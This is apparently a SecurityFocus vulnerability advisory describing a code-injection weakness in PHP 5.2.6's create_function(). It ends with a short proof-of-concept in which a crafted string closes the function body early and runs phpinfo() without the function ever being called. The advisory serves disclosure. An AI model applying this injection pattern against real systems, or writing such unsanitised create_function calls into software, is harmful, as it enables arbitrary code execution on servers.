source: http://www.securityfocus.com/bid/31398/info
 
PHP is prone to a code-injection weakness because it fails to sufficiently sanitize input to 'create_function()'. Note that the anonymous function returned need not be called for the supplied code to be executed.
 
An attacker who can exploit this weakness will be able to execute code with the privileges of an additional vulnerable program.
 
This weakness is reported in PHP 5.2.6; other versions may also be affected. 

<?php
$funstring = 'return -1 * var_dump($a[""]);}phpinfo();/*"]';
$unused = create_function('',$funstring);
?>